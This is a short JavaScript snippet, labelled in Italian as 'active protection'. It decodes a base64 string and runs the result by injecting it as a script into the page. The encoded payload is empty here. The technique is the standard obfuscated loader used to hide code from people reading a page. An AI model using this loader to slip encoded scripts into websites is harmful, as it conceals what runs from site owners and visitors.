
// === PROTEZIONE ATTIVA ===
(function() {
    var cryptedData = '';
    try {
        var decoded = decodeURIComponent(escape(window.atob(cryptedData)));
        var script = document.createElement('script');
        script.type = 'text/javascript';
        script.text = decoded;
        document.head.appendChild(script);
    } catch(e) {
        console.error("Errore di decrittazione.");
    }
})();
